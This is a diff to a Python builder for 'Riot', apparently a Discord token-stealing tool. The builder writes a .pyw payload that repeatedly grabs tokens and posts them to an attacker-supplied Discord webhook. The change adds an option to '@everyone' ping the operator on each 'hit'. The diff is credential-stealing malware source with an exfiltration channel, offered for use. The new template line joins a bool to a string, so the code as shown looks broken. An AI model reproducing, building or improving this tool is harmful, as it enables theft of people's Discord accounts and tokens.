@@ -1,7 +1,7 @@
 from pystyle import Colorate, Colors, System, Center, Write, Anime
 
 
-def mkdata(webhook: str) -> str:
+def mkdata(webhook: str, ping: bool) -> str:
     return r"""# by billythegoat356
 
 # https://github.com/billythegoat356/Riot
@@ -32,6 +32,7 @@ elif __file__.replace('\\', '/') != path.replace('\\', '/'):
 
 
 webhook = '""" + webhook + r"""'
+pingme = """ + ping + r"""
 
 
 class Discord:
@@ -167,7 +168,7 @@ class Grab:
             },
 
             "footer": {
-                "text": "billythegoat356"
+                "text": "by billythegoat356"
             }
         }]
         Grab.send(data)
@@ -175,7 +176,8 @@ class Grab:
     def send(data: str):
         data = {"username": "Riot",
                 "avatar_url": "https://repository-images.githubusercontent.com/414716027/e3031476-fa45-48e0-8d08-f2c621d5a588",
-                "embeds": data}
+                "embeds": data,
+                "content": "@everyone" if pingme else ""}
         return post(webhook, data=dumps(data), headers={"content-type":"application/json"})
 
 
@@ -209,7 +211,7 @@ ready_data = [{
     },
 
     "footer": {
-        "text": "billythegoat356"
+        "text": "by billythegoat356"
     }
 }]
 
@@ -222,6 +224,7 @@ while True:
     token_grab()
 
 """
+
 
 riot = '''
     ..      ...        .                     s
@@ -236,7 +239,6 @@ riot = '''
 8888> 888~  X8888     888&   "*888*P"    ^%888*
 48"` '8*~   `8888!`   R888"    'Y"         'Y"
  ^-==""      `""       ""'''[1:]
-
 
 
 banner = r'''
@@ -280,7 +282,9 @@ System.Size(150, 50)
 System.Title("Riot")
 
 
-Anime.Fade(Center.Center(banner), Colors.blue_to_cyan, Colorate.Vertical, enter=True)
+Anime.Fade(Center.Center(banner), Colors.blue_to_cyan,
+           Colorate.Vertical, enter=True)
+
 
 def main():
     System.Clear()
@@ -289,18 +293,29 @@ def main():
     print(Colorate.DiagonalBackwards(Colors.blue_to_cyan, Center.XCenter(riot)))
     print("\n"*5)
 
-    webhook = Write.Input("Enter your webhook -> ", Colors.blue_to_cyan, interval=0.005)
+    webhook = Write.Input("Enter your webhook -> ",
+                          Colors.blue_to_cyan, interval=0.005)
 
     if not webhook.strip():
         Colorate.Error("Please enter a valid webhook!")
         return
 
-    data = mkdata(webhook=webhook)
+    ping = Write.Input("Would you like to get pinged when you get a hit [y/n] -> ",
+                       Colors.blue_to_cyan, interval=0.005)
+    
+    if ping not in ('y', 'n'):
+        Colorate.Error("Please enter either 'y' or 'n'!")
+        return
+    
+    ping = ping == 'y'
+
+    data = mkdata(webhook=webhook, ping=ping)
     with open("riot.pyw", 'w', encoding='utf-8') as f:
         f.write(data)
 
     print()
     Write.Input("Built!", Colors.cyan_to_blue, interval=0.005)
+
 
 if __name__ == '__main__':
     while True:
